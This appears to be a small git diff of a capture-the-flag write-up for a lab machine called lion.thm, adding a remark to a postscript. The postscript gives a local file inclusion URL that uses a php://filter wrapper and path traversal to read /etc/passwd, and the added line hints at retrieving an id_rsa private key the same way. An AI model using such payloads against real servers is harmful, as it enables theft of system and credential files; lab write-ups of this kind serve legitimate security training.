@@ -176,7 +176,7 @@ Instead of uploading and compiling the exploit on remote machine, we can use `--
 P.S. If you are locked out and forgot to make a backdoor, here's food for thought:<br />
 There's LFI on this address.<br />
 `http://lion.thm:5555/?page=php://filter/convert.base64-encode/resource=../../../../etc/passwd`<br />
-where, lion.thm is the IP of machine in hosts file. ;)
+where, lion.thm is the IP of machine in hosts file. ;) (Maybe you can get id_rsa)
 
 
 
